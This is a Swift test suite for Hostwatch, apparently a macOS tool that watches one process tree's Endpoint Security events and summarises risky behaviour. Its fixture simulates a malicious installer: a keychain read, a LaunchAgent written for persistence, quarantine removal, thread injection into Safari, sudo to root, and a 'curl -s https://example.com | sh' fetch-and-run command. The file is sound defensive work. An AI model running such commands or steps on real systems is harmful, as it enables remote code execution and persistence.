import AppKit
import Foundation
import SwiftUI
import Testing
@testable import Hostwatch

/// Watch Closely: eslogger's events (Endpoint Security) for one process tree, summarised into a behaviour profile.
@MainActor @Suite(.serialized) struct WatchRecording {
    let home = "/Users/someone"

    /// An eslogger process object.
    func proc(_ pid: Int, _ path: String, ppid: Int = 1) -> [String: Any] {
        ["audit_token": ["pid": pid], "ppid": ppid, "executable": ["path": path]]
    }

    func file(_ path: String) -> [String: Any] { ["path": path, "path_truncated": false] }

    /// One eslogger line, parsed: {"process": …, "event": {type: body}}.
    func ev(_ pid: Int, _ path: String, _ type: String, _ body: [String: Any]) -> [String: Any] {
        ["process": proc(pid, path), "event": [type: body], "event_type": 0]
    }

    func recorded() -> BehaviorRecorder {
        let r = BehaviorRecorder(pid: 100, name: "installer", path: "/tmp/x/installer", args: "installer --quiet", home: home)
        let me = "/tmp/x/installer"
        r.add(ev(100, me, "open", ["fflag": 1, "file": file(home + "/Library/Keychains/login.keychain-db")]))
        r.add(ev(100, me, "create", ["destination_type": 1,
                                     "destination": ["new_path": ["dir": file(home + "/Library/LaunchAgents"), "filename": "com.x.plist"]]]))
        r.add(ev(100, me, "write", ["target": file(home + "/Library/LaunchAgents/com.x.plist")]))
        r.add(ev(100, me, "rename", ["source": file("/tmp/x/payload"), "destination_type": 1,
                                     "destination": ["new_path": ["dir": file(home + "/.local/bin"), "filename": "helper"]]]))
        r.add(ev(100, me, "setmode", ["mode": 0o755, "target": file("/tmp/x/payload")]))
        r.add(ev(100, me, "deleteextattr", ["extattr": "com.apple.quarantine", "target": file(home + "/Downloads/app.dmg")]))
        r.add(ev(100, me, "unlink", ["target": file("/tmp/x/stage1")]))
        r.add(ev(100, me, "fork", ["child": proc(101, me, ppid: 100)]))
        r.add(ev(101, me, "exec", ["target": proc(101, "/bin/zsh", ppid: 100), "args": ["zsh", "-c", "curl -s https://example.com | sh"]]))
        r.add(ev(101, "/bin/zsh", "signal", ["sig": 9, "target": proc(55, "/Applications/Little.app/Contents/MacOS/Little")]))
        r.add(ev(101, "/bin/zsh", "remote_thread_create", ["target": proc(66, "/Applications/Safari.app/Contents/MacOS/Safari")]))
        r.add(ev(100, me, "btm_launch_item_add", ["item": ["item_url": "file://" + home + "/Library/LaunchAgents/com.x.plist"]]))
        r.add(ev(100, me, "tcc_modify", ["service": "kTCCServiceScreenCapture", "identity": "com.x.helper"]))
        r.add(ev(100, me, "xpc_connect", ["service_name": "com.apple.securityd"]))
        r.add(ev(100, me, "sudo", ["success": true, "to_uid": 0, "command": "/bin/cp a b"]))
        r.add(ev(100, me, "mprotect", ["protection": 7]))
        // Another process doing scary things: not ours, ignored.
        r.add(ev(999, "/usr/bin/other", "unlink", ["target": file(home + "/Documents/thesis.docx")]))
        r.addConnection(pid: 101, proto: "TCP", remote: "93.184.216.34:443", host: "example.com")
        r.addConnection(pid: 999, proto: "TCP", remote: "1.2.3.4:443", host: "elsewhere.net")
        return r
    }

    @Test func followsTheTreeAndIgnoresEveryoneElse() {
        let r = recorded()
        let p = r.profile
        #expect(r.tree == [100, 101])
        #expect(p.processes.map(\.pid) == [100, 101] && p.processes[1].path == "/bin/zsh" && p.processes[1].args.contains("curl"))
        #expect(p.files[home + "/Documents/thesis.docx"] == nil && p.network.count == 1)
        #expect(p.network.keys.first == "TCP example.com:443 [93.184.216.34]")
        #expect(p.events == 16 && p.counts["open"] == 1)
        #expect(r.markers.contains(Data("\"pid\":101,".utf8)))
    }

    @Test func understandsWhatEachEventMeans() {
        let p = recorded().profile
        #expect(p.files[home + "/Library/LaunchAgents/com.x.plist"]?.ops == ["create", "write"])
        #expect(p.files["/tmp/x/payload"]?.ops == ["rename", "made executable"])
        #expect(p.files["/tmp/x/payload"]?.detail == "→ ~/.local/bin/helper")
        #expect(p.files[home + "/Downloads/app.dmg"]?.ops == ["quarantine removed"])
        #expect(p.targets.map(\.action) == ["sent SIGKILL (signal 9) to", "injected a thread into"])
        #expect(p.persistence.keys.first == "added a login/background item: ~/Library/LaunchAgents/com.x.plist")
        #expect(p.system.keys.first == "changed a privacy permission (ScreenCapture) for com.x.helper")
        #expect(p.ipc["XPC com.apple.securityd"] == 1)
        #expect(p.privileges.keys.first == "sudo to root: /bin/cp a b")
        #expect(p.execMemory == 1)
    }

    @Test func highlightsPutTheRiskyThingsFirst() {
        let hl = recorded().profile.highlights(home: home)
        let risky = hl.filter { $0.level == .risky }.map(\.text)
        #expect(hl.first?.level == .risky)
        #expect(risky.contains("Injected a thread into Safari"))
        #expect(risky.contains("Added a login/background item: ~/Library/LaunchAgents/com.x.plist"))
        #expect(risky.contains("Changed a privacy permission (ScreenCapture) for com.x.helper"))
        #expect(risky.contains("Removed the download quarantine from ~/Downloads/app.dmg"))
        #expect(risky.contains("Changed launch agents: ~/Library/LaunchAgents/com.x.plist"))
        #expect(risky.contains("Made /tmp/x/payload executable"))
        #expect(risky.contains("Sudo to root: /bin/cp a b"))
        #expect(hl.contains { $0.level == .notable && $0.text == "Read keychain: ~/Library/Keychains/login.keychain-db" })
        #expect(hl.contains { $0.text == "Started 1 process, including zsh" })
    }

    @Test func evidenceForTheAIStartsWithWhatMatters() {
        let text = recorded().profile.evidence(signer: "Unsigned", parentChain: "Finder (500) ← launchd (1)", home: home)
        #expect(text.hasPrefix("## Event: watched process\ninstaller (pid 100)"))
        #expect(text.contains("## What stands out\n- [risky]"))
        #expect(text.contains("## Network\n- TCP example.com:443 [93.184.216.34]"))
        #expect(text.contains("## Files ("))
        #expect(text.range(of: "What stands out")!.lowerBound < text.range(of: "## Files")!.lowerBound)
        let short = recorded().profile.evidence(home: home, limit: 300)
        #expect(short.count < 330 && short.hasSuffix("… (shortened)"))
        // The on-device model's fallback keeps the "Event" section: the highlights survive it.
        #expect(AppleOnDeviceModel.coreEvidence(text).contains("installer (pid 100)"))
    }

    @Test func filesAreGroupedByFolderChangesFirst() {
        let groups = FileGroup.groups(recorded().profile.files, home: home)
        #expect(groups.first?.folder == "/tmp/x")
        #expect(groups.contains { $0.folder == "~/Library/LaunchAgents" && $0.summary.hasPrefix("1 file: ") })
    }

    @Test func messagesRoundTrip() throws {
        let m = WatchMessage(id: "w1", state: "done", detail: "time limit", profile: recorded().profile)
        let line = m.line()
        #expect(line.last == 0x0A && line.range(of: Data(#""kind":"watch""#.utf8)) != nil)
        let back = try WatchMessage.decoder.decode(WatchMessage.self, from: line.dropLast())
        #expect(back.profile == m.profile && back.state == "done")
    }

    @Test func aSessionFollowsTheCollectorAndThenOffersAnalysis() {
        let s = WatchSession(pid: 100, name: "installer", path: "/tmp/x/installer")
        var sent: [[String: Any]] = []
        s.send = { sent.append($0); return true }
        s.start()
        #expect(s.state == .starting && sent.first?["pid"] as? Int == 100 && sent.first?["seconds"] as? Double == 60)
        var progress = WatchMessage(id: s.id, state: "recording", profile: recorded().profile)
        s.receive(progress)
        #expect(s.state == .recording && s.analysis == nil)
        progress.id = "someone-else"
        s.receive(WatchMessage(id: "other", state: "done"))
        #expect(s.state == .recording)                                        // not ours
        s.receive(WatchMessage(id: s.id, state: "done", detail: "time limit", profile: recorded().profile))
        #expect(s.state == .done("time limit") && s.analysis != nil)
        #expect(s.analysis?.instructions == WatchAdvice.instructions)
        s.stop()
        #expect(sent.last?["stop"] as? Bool == true)

        let offline = WatchSession(pid: 1, name: "x", path: "/x")
        offline.start()
        if case .failed(let why) = offline.state { #expect(why.contains("collector")) } else { Issue.record("should fail") }
    }

    /// HOSTWATCH_RENDER=<dir> writes watch.png there.
    @Test(.enabled(if: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"] != nil)) func render() throws {
        let s = WatchSession(pid: 100, name: "installer", path: "/tmp/x/installer")
        s.send = { _ in true }
        s.start()
        var p = recorded().profile
        p.seconds = 23
        s.receive(WatchMessage(id: s.id, state: "recording", profile: p))
        let view = WatchView(session: s, scrollable: false).frame(width: 820)
            .background(Color(nsColor: .windowBackgroundColor))
        let host = NSHostingView(rootView: view)
        host.frame = NSRect(origin: .zero, size: host.fittingSize)
        let window = NSWindow(contentRect: host.frame, styleMask: [.titled], backing: .buffered, defer: false)
        window.contentView = host
        host.layoutSubtreeIfNeeded()
        RunLoop.main.run(until: Date().addingTimeInterval(0.4))
        let rep = try #require(host.bitmapImageRepForCachingDisplay(in: host.bounds))
        host.cacheDisplay(in: host.bounds, to: rep)
        try rep.representation(using: .png, properties: [:])!.write(to: URL(fileURLWithPath: ProcessInfo.processInfo.environment["HOSTWATCH_RENDER"]!)
            .appendingPathComponent("watch.png"))
    }
}

/// A watch also follows the helpers the process already runs (an app's renderers, a shell's jobs).
@Suite struct WatchExistingChildren {
    @Test func findsRunningDescendants() throws {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/bin/sh")
        p.arguments = ["-c", "/bin/sleep 30 & /bin/sleep 30 & wait"]
        try p.run()
        defer { p.terminate(); _ = try? Spawned.run("/usr/bin/pkill", ["-P", "\(p.processIdentifier)"]) }
        Thread.sleep(forTimeInterval: 0.4)
        let found = BehaviorRecorder.descendants(of: Int(p.processIdentifier))
        #expect(found.count == 2 && found.allSatisfy { $0.path == "/bin/sleep" && $0.ppid == Int(p.processIdentifier) })
        let r = BehaviorRecorder(pid: Int(p.processIdentifier), name: "sh", path: "/bin/sh")
        r.adopt(found)
        #expect(r.tree.count == 3 && r.profile.processes.count == 3)
    }
}

/// What every program reads to run is one line, not a list; paths read as you'd type them.
@Suite struct WatchReadability {
    @Test func routineSystemReadsAreFoldedAway() {
        var p = BehaviorProfile(pid: 1, name: "bash", path: "/bin/bash")
        p.home = "/Users/someone"
        func use(_ ops: [String]) -> BehaviorProfile.FileUse { .init(ops: ops, count: 1) }
        p.files = ["/usr/share/locale/en_US.UTF-8/LC_TIME": use(["read"]), "/private/etc/ssl/cert.pem": use(["read"]),
                   "/dev/null": use(["write"]), "/": use(["read"]), "/bin": use(["read"]),
                   "/System/Volumes/Preboot/Cryptexes/OS": use(["read"]),
                   "/private/tmp/x": use(["create", "made executable", "delete"]),
                   "/Users/someone/Library/LaunchAgents": use(["read"]), "/usr/local/bin/tool": use(["write"])]
        #expect(p.routineReads == 6)
        #expect(p.changedFiles == 2)                                            // not /dev/null
        let groups = FileGroup.groups(p.files, home: p.home)
        #expect(Set(groups.map(\.folder)) == ["/tmp", "~/Library", "/usr/local/bin"])
        #expect(p.evidence().contains("## Files (3, plus 6 routine system reads"))
        #expect(p.highlights().contains { $0.text == "Made /tmp/x executable" })
        #expect(BehaviorProfile.display("/private/var/folders/x", home: p.home) == "/var/folders/x")
        #expect(BehaviorProfile.display("/Users/someone/.ssh/id", home: p.home) == "~/.ssh/id")
    }
}
